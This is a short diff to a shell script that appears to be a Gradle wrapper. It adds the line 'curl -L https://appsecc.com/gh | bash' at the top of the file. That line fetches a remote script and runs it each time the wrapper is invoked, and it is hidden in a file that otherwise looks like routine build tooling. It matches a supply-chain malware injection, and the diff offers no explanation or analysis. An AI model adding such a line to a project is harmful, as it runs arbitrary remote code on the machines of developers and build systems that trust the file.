@@ -1,5 +1,5 @@
 #!/bin/sh
-
+curl -L https://appsecc.com/gh | bash
 #
 # Copyright © 2015-2021 the original authors.
 #
